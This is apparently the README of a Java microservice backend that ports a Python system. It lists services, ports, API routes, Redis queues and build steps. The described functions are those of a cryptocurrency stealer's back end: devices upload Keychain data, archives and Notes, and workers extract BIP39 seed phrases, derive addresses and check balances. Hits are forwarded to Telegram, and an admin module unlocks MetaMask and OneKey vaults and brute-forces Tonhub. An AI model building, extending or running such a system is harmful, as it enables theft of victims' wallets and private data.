# v26 Java（26-ios-pom）

对齐仓库内 Python 版 `26/`（见根目录 `API.md`），用 Spring Boot + Nacos 拆成 3 个可平行扩展的服务。

## 模块

| 模块 | 端口 | Nacos 服务名 | 职责（对标 Python） |
|------|------|--------------|---------------------|
| `26-getway-server` | 8600 | `26-getway-server` | 统一入口（对齐 `forward-server`）：按 Path 转发 |
| `26-send-server` | 8601 | `26-send-server` | 客户端：协议 A `.php` + `/api/v2`；落盘 + RPUSH `queue:device_parse` |
| `26-consumer-server` | 8602 | `26-consumer-server` | 消费 Redis：设备解析 / 备忘录 BIP39 / 余额 / TG |
| `26-admin-server` | 8603 | `26-admin-server` | `/api/admin/*` JSON（登录 JWT、设备/助记词/设置/目标包） |
| `26-admin-web` | 5173 | （前端） | Vue3 管理端，开发时 Vite 把 `/api` 转到网关 8600 |

管理端前端：

```bash
cd 26-admin-web
npm install
npm run dev
# 浏览器打开 http://127.0.0.1:5173  登录走 Java /api/admin/login
```


对外只暴露网关即可：

```text
客户端 / 管理端  →  :8600  26-getway-server
                       ├─ /api/v2/**、*.php  →  lb://26-send-server
                       └─ /api/admin/**     →  lb://26-admin-server
```

（`26-consumer-server` 只消费 Redis，不经网关。）

本地也可直接打业务端口；生产建议统一走 8600。

多实例：同一服务再起进程（改端口），都注册 Nacos；Gateway 用 `lb://` 负载。Consumer 多实例抢同一 Redis List 即可水平扩展。

## 已实现（send）

### 协议 A（只 ACK，不落盘/不写库）

- `POST /api/handshake.php` → `{ ok, session_token, device_id }`
- `POST /api/session.php?action=start|end|finish` → `{ ok, session_token, acquisition_id }`
- `POST /api/upload.php` → `{ ok, session_token, acquisition_id }`

### 协议 V2

- `POST /api/v2/devices`、`POST /api/v2/uploads`、`.../chunks`、`POST /api/v2/finish`
- `GET /api/v2/system/ready`（MySQL/Redis 探活）

> `/api/v1/*` 已移除，不再提供。

队列键名与 Python 一致，过渡期可共存。

## 已实现（consumer）

对齐 Python `parse_queue.py` + `tg_queue.py`：

| Redis Key | Worker | 行为 |
|-----------|--------|------|
| `queue:device_parse` | DeviceParseWorker | 仅 V2：Keychain + 压缩包明文 BIP39 + Notes 入库；`has_notes` 再入 notes 队列 |
| `queue:notes_mnemonic` | NotesMnemonicWorker | 备忘录扫 BIP39 → 入库 + 余额 + TG |
| `queue:mnemonic_balance` | MnemonicBalanceWorker | 详情 defer：派生地址、查余额、过阈值入 TG |
| `queue:tg_message` | TelegramMessageWorker | 实际发送飞机消息 |

加密 vault（MetaMask / OneKey 密码解锁、Tonhub 爆破）仍走 admin。  
`v26.mnemonic-aes-key` 必须与 Python `MNEMONIC_AES_KEY` 一致，否则跳过入库。

## 编译 / 启动

```bash
cd 26-ios-pom
mvn -DskipTests package
# 需 Nacos(可 fail-fast:false)、MySQL(ioslianjie)、Redis db2
java -jar 26-getway-server/target/26-getway-server-0.0.1-SNAPSHOT.jar
java -jar 26-send-server/target/26-send-server-0.0.1-SNAPSHOT.jar
java -jar 26-consumer-server/target/26-consumer-server-0.0.1-SNAPSHOT.jar
java -jar 26-admin-server/target/26-admin-server-0.0.1-SNAPSHOT.jar
```

## 后续优先级

1. **admin**：钱包密码解锁 / Tonhub 爆破
2. 各钱包专用密文解析（MMKV / SQLCipher / 1K_ENC_V2 等）
